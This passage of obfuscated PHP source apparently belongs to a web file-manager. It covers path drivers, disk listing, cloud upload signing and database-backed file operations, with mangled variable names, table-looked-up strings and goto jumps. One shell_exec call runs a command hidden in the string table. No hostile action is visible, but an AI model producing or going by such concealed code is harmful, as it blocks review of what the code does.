$_SERVER[¤·²È‰º]; $ŞÅ½¥üÕ = $†Ë…Ï’™[1277] . ucfirst($Ò¤­ÅÔˆ); $Û”Ìˆå× = Model($†Ë…Ï’™[771])->get($ŞÅ½¥üÕ); if ($Û”Ìˆå×) { return $Û”Ìˆå×; } if ($Ò¤­ÅÔˆ == $†Ë…Ï’™[1270]) { $Û”Ìˆå× = self::make(Model($†Ë…Ï’™[826])->systemRootPathAdd($†Ë…Ï’™[552])); } else { $Û”Ìˆå× = self::systemPath($†Ë…Ï’™[1270]); $çıœö˜ = self::sourceID($Û”Ìˆå×); $Û”Ìˆå× = self::make(Model($†Ë…Ï’™[826])->mkdir($çıœö˜, $Ò¤­ÅÔˆ)); } Model($†Ë…Ï’™[771])->set($ŞÅ½¥üÕ, $Û”Ìˆå×); return $Û”Ìˆå×; } public static function systemFolder($şáä§‘Ô) { $©µŞä…¿ = IO_PATH_SYSTEM_SOURCE . $şáä§‘Ô; $õ™ŞŞÆû = Cache::get($©µŞä…¿); if (!$õ™ŞŞÆû) { $ªÂÍÓ´‹ = IO::infoFull($©µŞä…¿); if (!$ªÂÍÓ´‹) { $õ™ŞŞÆû = IO::mkdir($©µŞä…¿, REPEAT_SKIP); } else { $õ™ŞŞÆû = $ªÂÍÓ´‹[$_SERVER[¤·²È‰º][94]]; } Cache::set($©µŞä…¿, $õ™ŞŞÆû, 3600 * 10); } return $õ™ŞŞÆû; } public static function defaultDriver() { return Model($_SERVER[¤·²È‰º][768])->defaultDriver(); } public static function defaultIO() { $’í«İå€ =& $_SERVER[¤·²È‰º]; $ÄÖÈ×Ã = self::defaultDriver(); return $’í«İå€[1278] . $ÄÖÈ×Ã[$’í«İå€[407]] . $’í«İå€[1267]; } public static function defaultDriverInit() { static $§»‰üëø = false; if ($§»‰üëø) { return $§»‰üëø; } $§»‰üëø = IO::init(self::defaultIO()); return $§»‰üëø; } public static function fileTypeList() { $ƒ‹¼¶Š =& $_SERVER[¤·²È‰º]; $¨£†Á§ë = $GLOBALS[$ƒ‹¼¶Š[6]][$ƒ‹¼¶Š[1279]]; foreach ($¨£†Á§ë as $ØÍ¯Ê’Û => $Ó¥á–Š) { $üá³›¬› = $ƒ‹¼¶Š[1280] . $ØÍ¯Ê’Û; $¢åÁ¦µñ = LNG($üá³›¬›); if ($üá³›¬› != $¢åÁ¦µñ) { $¨£†Á§ë[$ØÍ¯Ê’Û][$ƒ‹¼¶Š[42]] = $¢åÁ¦µñ; } } return $¨£†Á§ë; } public static function diskList($šÃ×—çÇ = true) { $ÈªúÌà = $_SERVER[¤·²È‰º][1281]; if ($šÃ×—çÇ) { $éóóÌ× = Cache::get($ÈªúÌà); if (is_array($éóóÌ×)) { return $éóóÌ×; } } $éóóÌ× = self::diskListGet(); Cache::set($ÈªúÌà, $éóóÌ×, 60); return $éóóÌ×; } public static function diskListGet() { $¬ÌúèŞ =& $_SERVER[¤·²È‰º]; $Ÿö»­°  = array(); if ($GLOBALS[$¬ÌúèŞ[6]][$¬ÌúèŞ[1282]] == $¬ÌúèŞ[1283]) { $ÓÏí¤Ãí = $¬ÌúèŞ[1284]; for ($ã©ƒÎœ™ = 0; $ã©ƒÎœ™ < strlen($ÓÏí¤Ãí); $ã©ƒÎœ™++) { $ÔŒ´â = $ÓÏí¤Ãí[$ã©ƒÎœ™] . $¬ÌúèŞ[1285]; if (file_exists($ÔŒ´â)) { $Ÿö»­° [] = $ÔŒ´â; } } return $Ÿö»­° ; } if (!function_exists($¬ÌúèŞ[108])) { $Ÿö»­° [] = $¬ÌúèŞ[836]; return $Ÿö»­° ; } $äÁæ·‰Æ = explode($¬ÌúèŞ[18], shell_exec($¬ÌúèŞ[1286])); array_shift($äÁæ·‰Æ); array_pop($äÁæ·‰Æ); $Æâ˜şûÇ = array($¬ÌúèŞ[1287], $¬ÌúèŞ[1288], $¬ÌúèŞ[1289], $¬ÌúèŞ[1290], $¬ÌúèŞ[1291], $¬ÌúèŞ[1292], $¬ÌúèŞ[1293], $¬ÌúèŞ[1294]); foreach ($äÁæ·‰Æ as $Û¼¹Åàş) { $ğÏŸĞ¸„ = preg_split($¬ÌúèŞ[1295], $Û¼¹Åàş); $ÔŒ´â = $ğÏŸĞ¸„[count($ğÏŸĞ¸„) - 1]; if (!strstr($ğÏŸĞ¸„[0], $¬ÌúèŞ[1296]) || !$ÔŒ´â) { continue; } $í¿İ×£È = rtrim($ÔŒ´â, $¬ÌúèŞ[8]) . $¬ÌúèŞ[8]; if (in_array($í¿İ×£È, $Æâ˜şûÇ)) { continue; } $Ÿö»­° [] = $í¿İ×£È; } return $Ÿö»­° ; } public static function isSameDisk($¿‹¬¬È, $ƒËÑ¢Šš) { $Ñ¦´°ßõ =& $_SERVER[¤·²È‰º]; if ($GLOBALS[$Ñ¦´°ßõ[6]][$Ñ¦´°ßõ[1282]] == $Ñ¦´°ßõ[1283]) { return strtolower(substr($¿‹¬¬È, 0, 1)) == strtolower(substr($ƒËÑ¢Šš, 0, 1)); } $ºÖŸ›ÔÄ = self::diskList(); $ùÔĞÊÉÆ = !1; $’éÎâŞ¨ = !1; sort($ºÖŸ›ÔÄ); $ºÖŸ›ÔÄ = array_reverse($ºÖŸ›ÔÄ); $¿‹¬¬È = rtrim($¿‹¬¬È, $Ñ¦´°ßõ[8]) . $Ñ¦´°ßõ[8]; $ƒËÑ¢Šš = rtrim($ƒËÑ¢Šš, $Ñ¦´°ßõ[8]) . $Ñ¦´°ßõ[8]; foreach ($ºÖŸ›ÔÄ as $¤ì¸Ä¥ş) { $Ä¦ëê¸ = strlen($¤ì¸Ä¥ş); if (!$ùÔĞÊÉÆ && substr($¿‹¬¬È, 0, $Ä¦ëê¸) == $¤ì¸Ä¥ş) { $ùÔĞÊÉÆ = $¤ì¸Ä¥ş; } if (!$’éÎâŞ¨ && substr($ƒËÑ¢Šš, 0, $Ä¦ëê¸) == $¤ì¸Ä¥ş) { $’éÎâŞ¨ = $¤ì¸Ä¥ş; } if ($ùÔĞÊÉÆ && $’éÎâŞ¨) { break; } } return $ùÔĞÊÉÆ === $’éÎâŞ¨; } public static function transferType($Ï×æ‚Æú, $­Ÿ¬È“) { $Ô€ÀÙòñ =& $_SERVER[¤·²È‰º]; $™¶«àÓ¿ = self::driverType($Ï×æ‚Æú); $Şİ‘ØÃ = self::driverType($­Ÿ¬È“); if ($™¶«àÓ¿[$Ô€ÀÙòñ[43]] == $Şİ‘ØÃ[$Ô€ÀÙòñ[43]] && $™¶«àÓ¿[$Ô€ÀÙòñ[1297]] == $Şİ‘ØÃ[$Ô€ÀÙòñ[1297]]) { return $Ô€ÀÙòñ[1298]; } if ($™¶«àÓ¿[$Ô€ÀÙòñ[43]] == $Ô€ÀÙòñ[865] && $Şİ‘ØÃ[$Ô€ÀÙòñ[43]] == $Ô€ÀÙòñ[116]) { return $Ô€ÀÙòñ[1193]; } if ($™¶«àÓ¿[$Ô€ÀÙòñ[43]] == $Ô€ÀÙòñ[116] && $Şİ‘ØÃ[$Ô€ÀÙòñ[43]] == $Ô€ÀÙòñ[865]) { return $Ô€ÀÙòñ[117]; } return $Ô€ÀÙòñ[1299]; } public static function driverType($Œ¯´ˆµª) { $Ğ ™Û¢Â =& $_SERVER[¤·²È‰º]; $©È¨æá = str_replace($Ğ ™Û¢Â[1300], $Ğ ™Û¢Â[12], strtolower($Œ¯´ˆµª->getType())); if ($©È¨æá == $Ğ ™Û¢Â[759] || $©È¨æá == $Ğ ™Û¢Â[1301] || $©È¨æá == $Ğ ™Û¢Â[1302]) { $Œ¯´ˆµª = self::defaultDriverInit(); } else { if ($©È¨æá == $Ğ ™Û¢Â[1200] || $©È¨æá == $Ğ ™Û¢Â[1303]) { $Œ¯´ˆµª = IO::init($Œ¯´ˆµª->pathParse[$Ğ ™Û¢Â[1145]]); } } $¤¿ùÅâİ = $Œ¯´ˆµª->path; $©È¨æá = str_replace($Ğ ™Û¢Â[1300], $Ğ ™Û¢Â[12], strtolower($Œ¯´ˆµª->getType())); if ($©È¨æá == $Ğ ™Û¢Â[116]) { return array($Ğ ™Û¢Â[43] => $Ğ ™Û¢Â[116], $Ğ ™Û¢Â[1297] => $Ğ ™Û¢Â[12], $Ğ ™Û¢Â[94] => $¤¿ùÅâİ); } return array($Ğ ™Û¢Â[43] => $Ğ ™Û¢Â[865], $Ğ ™Û¢Â[1297] => $Œ¯´ˆµª->pathDriver, $Ğ ™Û¢Â[94] => $¤¿ùÅâİ); } public static function pathDriverType($„áùÉ±ª) { return $„áùÉ±ª ? self::driverType(IO::init($„áùÉ±ª)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Î°ôîÎ) { parent::__construct($Î°ôîÎ); $this->signatureVersion($_SERVER[¤·²È‰º][226]); } public function uploadFormData($Çè¸€„ù, $¤áŠ‚êÓ = 3600) { $Šó¢ÂÑÛ =& $_SERVER[¤·²È‰º]; $Ÿç¬ĞÖè = $Šó¢ÂÑÛ[208]; $ö´ÒªÀ¥ = $Šó¢ÂÑÛ[241]; $½ëëˆ = $Šó¢ÂÑÛ[1304]; $ÕÄ­öÚû = gmdate($Šó¢ÂÑÛ[1305], time() + $¤áŠ‚êÓ); $½Ï’×ø· = (string) time() . $Šó¢ÂÑÛ[81] . (string) (time() + $¤áŠ‚êÓ); $ÉÌª˜‡ô = array($Šó¢ÂÑÛ[1306] => $ÕÄ­öÚû, $Šó¢ÂÑÛ[1307] => array(array($Šó¢ÂÑÛ[1308] => $Ÿç¬ĞÖè), array($Šó¢ÂÑÛ[1309] => $this->bucket), array($Šó¢ÂÑÛ[1310], $Šó¢ÂÑÛ[1311], $Šó¢ÂÑÛ[12]), array($Šó¢ÂÑÛ[1312] => $½ëëˆ), array($Šó¢ÂÑÛ[1313] => $ö´ÒªÀ¥), array($Šó¢ÂÑÛ[1314] => $this->accessKey), array($Šó¢ÂÑÛ[1315] => $½Ï’×ø·))); $ÉÌª˜‡ô = json_encode($ÉÌª˜‡ô); $¸ÙšŞÖç = hash_hmac($Šó¢ÂÑÛ[241], $½Ï’×ø·, $this->secret); $ÉÁ•º‰ƒ = sha1($ÉÌª˜‡ô); $İ´ ä¿® = hash_hmac($Šó¢ÂÑÛ[241], $ÉÁ•º‰ƒ, $¸ÙšŞÖç); $«Ñ“×şú = array($Šó¢ÂÑÛ[1308] => $Ÿç¬ĞÖè, $Šó¢ÂÑÛ[1312] => $½ëëˆ, $Šó¢ÂÑÛ[1316] => base64_encode($ÉÌª˜‡ô), $Šó¢ÂÑÛ[1313] => $ö´ÒªÀ¥, $Šó¢ÂÑÛ[1314] => $this->accessKey, $Šó¢ÂÑÛ[1317] => $½Ï’×ø·, $Šó¢ÂÑÛ[1318] => $İ´ ä¿®, $Šó¢ÂÑÛ[191] => $this->getHost()); return $«Ñ“×şú; } public function fileOutLink($¤ÕÔı‰) { $â¯¿ ÏÓ =& $_SERVER[¤·²È‰º]; if (substr($¤ÕÔı‰, 0, 7) == $â¯¿ ÏÓ[1319]) { $¤ÕÔı‰ = $â¯¿ ÏÓ[1320] . substr($¤ÕÔı‰, 7); } header($â¯¿ ÏÓ[171] . $¤ÕÔı‰); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¸ëœ‡æ) { $this->pathParse = $¸ëœ‡æ; $this->model = Model($_SERVER[¤·²È‰º][1321]); } public function getPath($öØà”ò·) { return trim($öØà”ò·, $_SERVER[¤·²È‰º][8]); } public function pathFather($ì«ÀŠ) { $«·ºã’á = $this->parse($ì«ÀŠ); $«·ºã’á = $this->infoSimple($ì«ÀŠ); return $«·ºã’á ? $«·ºã’á[$_SERVER[¤·²È‰º][440]] : !1; } public function pathThis($˜ş’Ø‘ö) { $ïüŠ™– = $this->infoSimple($˜ş’Ø‘ö); return $ïüŠ™– ? $ïüŠ™–[$_SERVER[¤·²È‰º][42]] : !1; } public function getPathOuter($ïÕ½Ä ¥) { if (!$ïÕ½Ä ¥) { return $ïÕ½Ä ¥; } $¨¤¤ßª÷ = $this->parse($ïÕ½Ä ¥); return KodIO::make($¨¤¤ßª÷[$_SERVER[¤·²È‰º][407]]); } public function copyFolderFromIO($©ãëš‡Ç, $¹“Œº¤‘, $Œ…Œ»Ÿ, $–Œ¶áÑß, $ùŞÂô·‡) { $ÍÃı¿€á = $this->model->copyFolderFromIO($©ãëš‡Ç, $¹“Œº¤‘, $Œ…Œ»Ÿ, $–Œ¶áÑß, $ùŞÂô·‡); return KodIO::make($ÍÃı¿€á); } public function isParentOf($àı’Ëé, $îÍÀâ‘æ) { return $this->model->isParentOf($àı’Ëé, $îÍÀâ‘æ); } public function mkfile($ñ¶¹âõß, $Ö«¡”³ğ = '', $¼ÜÒªÜÆ = REPEAT_RENAME) { $·ø¥Ó´ =& $_SERVER[¤·²È‰º]; $ò±Â° = $this->parse($ñ¶¹âõß); $ñ¶¹âõß = $ò±Â°[$·ø¥Ó´[407]]; for ($ã¡­Àì¢ = 0; $ã¡­Àì¢ < count($ò±Â°[$·ø¥Ó´[1322]]); $ã¡­Àì¢++) { $ûÄ…÷³ß = $ò±Â°[$·ø¥Ó´[1322]][$ã¡­Àì¢]; if ($ã¡­Àì¢ == count($ò±Â°[$·ø¥Ó´[1322]]) - 1) { $ñ¶¹âõß = $this->model->mkfile($ñ¶¹âõß, $ûÄ…÷³ß, $Ö«¡”³ğ, $¼ÜÒªÜÆ); break; } $ñ¶¹âõß = $this->model->mkdir($ñ¶¹âõß, $ûÄ…÷³ß, REPEAT_SKIP); } return $this->getPathOuter($ñ¶¹âõß); } public function mkdir($§µúûÆ†, $–äá¼¼ñ = REPEAT_SKIP) { $Îš¤€¸ =& $_SERVER[¤·²È‰º]; $º”ëÈ¶ = $this->parse($§µúûÆ†); $§µúûÆ† = $º”ëÈ¶[$Îš¤€¸[407]]; for ($âúºî¹• = 0; $âúºî¹• < count($º”ëÈ¶[$Îš¤€¸[1322]]); $âúºî¹•++) { $»ïœÅ‚ƒ = $º”ëÈ¶[$Îš¤€¸[1322]][$âúºî¹•]; $§µúûÆ† = $this->model->mkdir($§µúûÆ†, $»ïœÅ‚ƒ, $–äá¼¼ñ); } return $this->getPathOuter($§µúûÆ†); } public function copyFile($°ÍÇö”í, $Öñ¬øÅ¯, $¼–„³Ğ´ = REPEAT_REPLACE) { $’å¤øö‘ =& $_SERVER[¤·²È‰º]; $Ñ‡êÂ = $this->parse($Öñ¬øÅ¯); $±ƒÙâÖ£ = $this->model->copy($°ÍÇö”í, $Ñ‡êÂ[$’å¤øö‘[407]], $¼–„³Ğ´, $Ñ‡êÂ[$’å¤øö‘[94]]); return $±ƒÙâÖ£ ? $this->getPathOuter($±ƒÙâÖ£) : !1; } public function moveFile($±´¡ÈÏ„, $Î·‚‹Ü, $÷“‘ĞÂï = REPEAT_REPLACE) { $¬¯ˆ‹ºó =& $_SERVER[¤·²È‰º]; $áÕÍĞ²• = $this->parse($Î·‚‹Ü); $ÕÔÆ¹ºƒ = $this->model->move($±´¡ÈÏ„, $áÕÍĞ²•[$¬¯ˆ‹ºó[407]], $÷“‘ĞÂï, $áÕÍĞ²•[$¬¯ˆ‹ºó[94]]); return $ÕÔÆ¹ºƒ ? $this->getPathOuter($ÕÔÆ¹ºƒ) : !1; } public function copy($òˆŒ¨Åù, $Á«òÜš, $ë‘´°äÌ = REPEAT_REPLACE, $ûá²İ  = false) { $÷¼›Ò = $this->parse($Á«òÜš); $ß»ÆŒíï = $this->model->copy($òˆŒ¨Åù, $÷¼›Ò[$_SERVER[¤·²È‰º][407]], $ë‘´°äÌ, $ûá²İ ); return $ß»ÆŒíï ? $this->getPathOuter($ß»ÆŒíï) : !1; } public function moveSameAllow() { } public function move($Ëü“×Öô, $ÊèÓô„Ü, $ºÇ¥ = REPEAT_REPLACE, $…Ø†™ = false) { $Èú³ş æ = $this->parse($ÊèÓô„Ü); $ë‰¾ûÊÚ = $this->model->move($Ëü“×Öô, $Èú³ş æ[$_SERVER[¤·²È‰º][407]], $ºÇ¥, $…Ø†™); return $ë‰¾ûÊÚ ? $this->getPathOuter($ë‰¾ûÊÚ) : !1; } public function remove($İ¾¨œê½, $Ü‰’¡Ÿµ = true) { return $this->model->remove($İ¾¨œê½, $Ü‰’¡Ÿµ); } public function rename($Ó•ÊÈĞã, $´øœ‘›İ) { $œ«å‚ÛÆ = $this->model->rename($Ó•ÊÈĞã, $´øœ‘›İ); return $œ«å‚ÛÆ ? $this->getPathOuter($Ó•ÊÈĞã) : $œ«å‚ÛÆ; } public function size($‰ÛºÌ‰) { $¢ßû›Îç = $this->infoSimple($‰ÛºÌ‰); return $¢ßû›Îç ? $¢ßû›Îç[$_SERVER[¤·²È‰º][86]] : 0; } public function infoSimple($´Ãó¿¨§) { return $this->model->sourceInfo($´Ãó¿¨§); } public function info($²áŞÂŠñ) { return $this->infoParse($²áŞÂŠñ); } public function infoAuth($Ê¢çÑ™Ç) { return $this->infoParse($Ê¢çÑ™Ç, !1, !0); } public function infoWithChildren($úôëŒÒ) { return $this->infoParse($úôëŒÒ, !0); } protected function infoParse($†Âà‚´, $¿ÎÓÖ¢Ğ = false, $û˜ªŒß˜ = false) { if (!$¿ÎÓÖ¢Ğ) { return $this->model->pathInfo($†Âà‚´, $û˜ªŒß˜); } return $this->model->pathInfoMore($†Âà‚´); } public function infoFull($Ó’ÇòÖÛ) { $ŸÉ¦ŸÊ =& $_SERVER[¤·²È‰º]; $äµÚÍÏ = explode($ŸÉ¦ŸÊ[8], $Ó’ÇòÖÛ); $§½²®è¦ = implode($ŸÉ¦ŸÊ[8], array_splice($äµÚÍÏ, 1)); return $this->model->pathInfoByPath($äµÚÍÏ[0], $§½²®è¦); } public function hashSimple($¸áİãê) { $›şÂŸ³ =& $_SERVER[¤·²È‰º]; $æÕ›²ßƒ = $this->infoWithChildren($¸áİãê); return $æÕ›²ßƒ[$›şÂŸ³[180]][$›şÂŸ³[187]]; } public function hashMd5($Ïüé‡œ®) { $ùÍØ›¨ =& $_SERVER[¤·²È‰º]; $î’ï‰¼” = $this->infoWithChildren($Ïüé‡œ®); return $î’ï‰¼”[$ùÍØ›¨[180]][$ùÍØ›¨[186]]; } public function exist($ÁéíĞÛÀ) { $®°¦Œí‘ =& $_SERVER[¤·²È‰º]; $áì÷×ÁÎ = $this->parse($ÁéíĞÛÀ); if (!$áì÷×ÁÎ[$®°¦Œí‘[94]]) { return $this->isFile($ÁéíĞÛÀ) || $this->isFolder($ÁéíĞÛÀ); } $ãşŠøŒé = array($®°¦Œí‘[409] => $áì÷×ÁÎ[$®°¦Œí‘[407]], $®°¦Œí‘[42] => $áì÷×ÁÎ[$®°¦Œí‘[94]]); $ú¸ùÆ…€ = $this->model->where($ãşŠøŒé)->find(); return $ú¸ùÆ…€ ? !0 : !1; } public function isFile($ûè‚›©) { $ŒÄ÷œœ„ =& $_SERVER[¤·²È‰º]; $—şÉá“ = $this->infoSimple($ûè‚›©); return $—şÉá“ && $—şÉá“[$ŒÄ÷œœ„[418]] == $ŒÄ÷œœ„[98] ? !1 : !0; } public function isFolder($³†ú‡Éè) { $¦“Éã† =& $_SERVER[¤·²È‰º]; $ÛÀüÛ¢º = $this->infoSimple($³†ú‡Éè); return $ÛÀüÛ¢º && $ÛÀüÛ¢º[$¦“Éã†[418]] == $¦“Éã†[98] ? !0 : !1; } public function listPath($Àô˜àôŞ, $½‘îîÉ = false) { $Çö¾¹¦û =& $_SERVER[¤·²È‰º]; if ($Àô˜àôŞ == $Çö¾¹¦û[12]) { return !1; } $×óóĞ¼… = array($Çö¾¹¦û[409] => $Àô˜àôŞ); if ($½‘îîÉ) { return $this->model->listSource($×óóĞ¼…, -1); } return $this->model->listSource($×óóĞ¼…); } public function has($€æ’©Ú, $³«’ƒ™§ = false, $ŠùªÜ§ = null) { $ï«—ø¨¥ =& $_SERVER[¤·²È‰º]; $–Œºœµ = $this->infoWithChildren($€æ’©Ú); if ($³«’ƒ™§) { return array($ï«—ø¨¥[218] => $–Œºœµ[$ï«—ø¨¥[218]], $ï«—ø¨¥[217] => $–Œºœµ[$ï«—ø¨¥[217]]); } return $ŠùªÜ§ ? $–Œºœµ[$ï«—ø¨¥[218]] : $–Œºœµ[$ï«—ø¨¥[217]]; } public function listAll($ñ´Ë¹«ë) { $áöµíÉÚ = IO::info($this->pathParse[$_SERVER[¤·²È‰º][94]]); if (!$áöµíÉÚ) { return array(); } return $this->model->listAll($ñ´Ë¹«ë); } public function getContent($ë«ûúşŸ) { return $this->model->getContent($ë«ûúşŸ); } public function setContent($àÄ¡°«Ç, $»¢Èµßº = '') { return $this->model->setContent($àÄ¡°«Ç, $»¢Èµßº); } public function fileSubstr($Ã¶š‘Ôï, $ôÒëæ‚, $Ù÷Í‚ ) { return $this->model->fileSubstr($Ã¶š‘Ôï, $ôÒëæ‚, $Ù÷Í‚ ); } public function download($ŒíËÆåñ, $â¦Èü”º = '') { $”ØÜÇÑË = get_path_father($â¦Èü”º); $ÓÆ‡ø²Î = get_path_this($â¦Èü”º); $—æ¤ŸÒ = $this->model->fileInfoGet($ŒíËÆåñ); $äçËû“ = IO::copy($—æ¤ŸÒ[$_SERVER[¤·²È‰º][94]], $”ØÜÇÑË, !1, $ÓÆ‡ø²Î); return $äçËû“; } public function setModifyTime($Ò²í¥ˆÁ, $¥È™¡íê = '') { $™±˜âŸ– =& $_SERVER[¤·²È‰º]; if (!$Ò²í¥ˆÁ) { return; } $this->model->where(array($™±˜âŸ–[425] => $Ò²í¥ˆÁ))->save(array($™±˜âŸ–[95] => $¥È™¡íê)); } public function upload($ÈğäåÎ, $ªùÇ×‡¼, $ÁŞıÔ…¾ = false, $ÔÛìŒŸ = REPEAT_REPLACE) { $Ë“½Ş© =& $_SERVER[¤·²È‰º]; $ÎîˆÈø = $this->parse($ÈğäåÎ); $—œÏ‡ê» = $this->model->addFile($ÎîˆÈø[$Ë“½Ş©[407]], $ªùÇ×‡¼, $ÎîˆÈø[$Ë“½Ş©[94]], $ÁŞıÔ…¾, $ÔÛìŒŸ); return $this->getPathOuter($—œÏ‡ê»); } public function uploadFileByID($à¼ÍÜÂ¨, $ØËÙüñÃ, $ìöâ¦†ö) { $¿—Ï‡½¥ =& $_SERVER[¤·²È‰º]; $»àêŠü³ = $this->parse($à¼ÍÜÂ¨); $³é•ãÀÖ = $this->model->addFileByFileID($»àêŠü³[$¿—Ï‡½¥[407]], $ØËÙüñÃ, $»àêŠü³[$¿—Ï‡½¥[94]], $ìöâ¦†ö); return $this->getPathOuter($³é•ãÀÖ); } public function addFileByRemote($³Š¡±Ö, $™›©Â„, $ºšˆŞØá = array(), $Ø–¥¡Å… = '', $¿çç™) { $ßÁ½’„ˆ =& $_SERVER[¤·²È‰º]; $î”ƒÙ = $this->parse($³Š¡±Ö); $Ø–¥¡Å… = empty($Ø–¥¡Å…) ? $î”ƒÙ[$ßÁ½’„ˆ[94]] : $Ø–¥¡Å…; $×‡óìÚ¦ = $this->model->addFileByRemote($î”ƒÙ[$ßÁ½’„ˆ[407]], $™›©Â„, $Ø–¥¡Å…, $ºšˆŞØá, $¿çç™); return $this->getPathOuter($×‡óìÚ¦); } public function uploadLink($ºæ„û¸Ç, $±¼ÉÁÌ = 0) { $ÓÙÂ—ŸØ =& $_SERVER[¤·²È‰º]; $Ğ•Ü¤Å = $this->parse($ºæ„û¸Ç); $×³¾Ÿ‘µ = _get($GLOBALS[$ÓÙÂ—ŸØ[7]], $ÓÙÂ—ŸØ[1323]); $Õæ¨‘Ÿª = _get($GLOBALS[$ÓÙÂ—ŸØ[7]], $ÓÙÂ—ŸØ[1324]); $ºæ„û¸Ç = Model($ÓÙÂ—ŸØ[617])->createFileName($Ğ•Ü¤Å[$ÓÙÂ—ŸØ[94]], $×³¾Ÿ‘µ, $Õæ¨‘Ÿª); return IO::uploadLink($ºæ„û¸Ç, $±¼ÉÁÌ); } public function fileNameAuto($Ü™ÕØõï, $Şó¬Ï‚Ú, $Ìö¯ƒŸ = REPEAT_REPLACE, $›£‡¿è° = false) { return $this->model->fileNameAuto($Ü™ÕØõï, $Şó¬Ï‚Ú, $Ìö¯ƒŸ, $›£‡¿è°); } public function fileNameExist($·Ìı¢šÕ, $İşï®í¥) { return $this->model->fileNameExist($·Ìı¢šÕ, $İşï®í¥); } protected function _fileOut($¶ôşáµ¨, $¾íş» £ = false, $·†î ¿“ = false, $ùÕµıáÑ = '', $êÜáï¾Ó = false) { $õ¤§œ¼¡ =& $_SERVER[¤·²È‰º]; $ãæüÜºí = $this->model->sourceInfo($¶ôşáµ¨); if ($ãæüÜºí[$õ¤§œ¼¡[418]] == $õ¤§œ¼¡[98]) { header($õ¤§œ¼¡[1325]); die; } $¥•à¶Ñ£ = $this->model->fileInfoGet($¶ôşáµ¨); $ùÕµıáÑ = $¥•à¶Ñ£[$õ¤§œ¼¡[186]] ? $¥•à¶Ñ£[$õ¤§œ¼¡[186]] : $ùÕµıáÑ; $¡õ¡ÅÏá = isset($GLOBALS[$õ¤§œ¼¡[1326]]) ? $GLOBALS[$õ¤§œ¼¡[1326]] : $ãæüÜºí[$õ¤§œ¼¡[42]]; if ($êÜáï¾Ó) { return IO::fileOutServer($¥•à¶Ñ£[$õ¤§œ¼¡[94]], $¾íş» £, $¡õ¡ÅÏá, $ùÕµıáÑ); } IO::fileOut($¥•à¶Ñ£[$õ¤§œ¼¡[94]], $¾íş» £, $¡õ¡ÅÏá, $ùÕµıáÑ); } public function fileOut($©¹Ö‘ù¡, $µ÷¨ÜóÄ = false, $§†ğüç = false, $Ì€ª×”é = '') { $this->_fileOut($©¹Ö‘ù¡, $µ÷¨ÜóÄ, $§†ğüç, $Ì€ª×”é); } public function fileOutServer($ôÚ‚å“º, $şƒòš¤½ = false, $«ÑıÁê = false, $ÜÌå²‘Õ = '') { $this->_fileOut($ôÚ‚å“º, $şƒòš¤½, $«ÑıÁê, $ÜÌå²‘Õ, !0); } protected function _fileOutImage($’˜ı• , $ëß¤À÷  = 250) { $İïó˜ ³ =& $_SERVER[¤·²È‰º]; $Ë©ï“ = $this->model->pathInfo($’˜ı• ); if ($Ë©ï“[$İïó˜ ³[418]] == $İïó˜ ³[98]) { show_json($İïó˜ ³[1327] . $’˜ı• , !1); } $†Ÿ¯şÃÕ = $this->model->fileInfoGet($’˜ı• ); $†Ÿ¯şÃÕ[$İïó˜ ³[42]] = $Ë©ï“[$İïó˜ ³[42]]; $†Ÿ¯şÃÕ[$İïó˜ ³[179]] = $Ë©ï“[$İïó˜ ³[179]]; $GLOBALS[$İïó˜ ³[1326]] = $†Ÿ¯şÃÕ[$İïó˜ ³[42]]; $GLOBALS[$İïó˜ ³[178]] = $†Ÿ¯şÃÕ; IO::fileOutImage($†Ÿ¯şÃÕ[$İïó˜ ³[94]], $ëß¤À÷ ); } public function fileOutImage($½æ¾Ôœ«, $ï³¤¬ = 250) { $this->_fileOutImage($½æ¾Ôœ«, $ï³¤¬); } public function fileOutImageServer($´’­¸éŠ, $Ìí±†çû = 250) { $this->_fileOutImage($´’­¸éŠ, $Ìí±†çû); } public function link($°îÔ£µÕ, $Æ¯ß§Š = '') { $çæú­… = $this->model->fileInfoGet($°îÔ£µÕ); return IO::link($çæú­…[$_SERVER[¤·²È‰º][94]], $Æ¯ß§Š); } protected function parse($Üà—½˜«) { $ÃÂüÍÃá =& $_SERVER[¤·²È‰º]; if (strstr($Üà—½˜«, $ÃÂüÍÃá[8]) === !1) { return array($ÃÂüÍÃá[427] => intval($Üà—½˜«), $ÃÂüÍÃá[94] => $ÃÂüÍÃá[12], $ÃÂüÍÃá[1322] => array()); } $˜³‘€áÀ = explode($ÃÂüÍÃá[8], trim($Üà—½˜«, $ÃÂüÍÃá[8])); if (count($˜³‘€áÀ) < 2) { show_tips(clear_html($Üà—½˜«) . $ÃÂüÍÃá[1328]); } return array($ÃÂüÍÃá[427] => intval($˜³‘€áÀ[0]), $ÃÂüÍÃá[94] => $˜³‘€áÀ[1], $ÃÂüÍÃá[1322] => array_slice($˜³‘€áÀ, 1)); } } goto BÊæÑ’¨; aá²‰èŞÅ‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($åÅ‡‚÷ª) { $«¡©ÜóŠ =& $_SERVER[¤·²È‰º]; return array($«¡©ÜóŠ[1934] => array($«¡©ÜóŠ[2316] . USER_ID, $«¡©ÜóŠ[1935])); } protected function listData() { $ÚÉÂ›İ =& $_SERVER[¤·²È‰º]; $Á†÷³Šæ = array($ÚÉÂ›İ[1642] => USER_ID, $ÚÉÂ›İ[492] => array($ÚÉÂ›İ[1938], 0)); $ Ş¿ßİö = $ÚÉÂ›İ[2317]; $å¿­Õóõ = $this->field($ Ş¿ßİö)->where($Á†÷³Šæ)->order($ÚÉÂ›İ[1941])->select(); return $å¿­Õóõ ? $å¿­Õóõ : array(); } protected function addToTag($Èğ£Æ„ö, $‡Ã†¡´š) { $Ä¸‡¦´ =& $_SERVER[¤·²È‰º]; if (!Model($Ä¸‡¦´[2078])->listData($‡Ã†¡´š)) { return !1; } if (is_numeric($Èğ£Æ„ö)) { $±Úé¤½‘ = Model($Ä¸‡¦´[826])->pathInfo($Èğ£Æ„ö); if (!$±Úé¤½‘) { return !1; } } else { $±Úé¤½‘ = IO::infoSimple($Èğ£Æ„ö); if (!$±Úé¤½‘) { return !1; } $ËàÍ‹Ù¥ = $±Úé¤½‘[$Ä¸‡¦´[42]]; $áÄÎÜ§ì = $±Úé¤½‘[$Ä¸‡¦´[43]]; if (isset($±Úé¤½‘[$Ä¸‡¦´[418]])) { $áÄÎÜ§ì = $±Úé¤½‘[$Ä¸‡¦´[418]] == $Ä¸‡¦´[98] ? $Ä¸‡¦´[85] : 